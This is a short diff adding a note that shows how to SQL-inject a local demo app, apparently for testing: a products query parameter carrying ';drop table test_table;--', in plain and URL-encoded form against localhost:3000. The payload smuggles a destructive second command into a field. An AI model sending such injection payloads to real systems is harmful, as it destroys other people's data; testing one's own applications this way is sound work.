@@ -1,0 +1,7 @@
+to sql inject and drop the table, test table:
+
+products?name=';drop table test_table;--
+
+or
+
+http://localhost:3000/products?name=%27;drop%20table%20test_table;--
